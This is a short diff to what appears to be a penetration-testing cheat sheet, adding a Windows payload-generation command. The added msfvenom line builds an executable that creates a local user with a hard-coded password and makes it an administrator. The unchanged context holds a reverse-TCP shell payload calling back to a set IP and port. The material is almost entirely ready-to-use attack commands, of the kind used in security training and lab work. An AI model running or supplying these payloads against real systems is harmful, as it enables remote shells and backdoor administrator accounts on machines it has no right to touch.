@@ -387,6 +387,9 @@ exploit -j
 #### Windows Payload Generation
 
 ```
+# add local admin
+msfvenom -p windows/x64/exec CMD='cmd.exe /k "net user /add likes Passw0rd! && net localgroup administrators likes /add && exit"' -o adduser2.exe -f exe
+
 # reverse tcp
 msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.83 LPORT=444 -f exe -o tl.exe
 
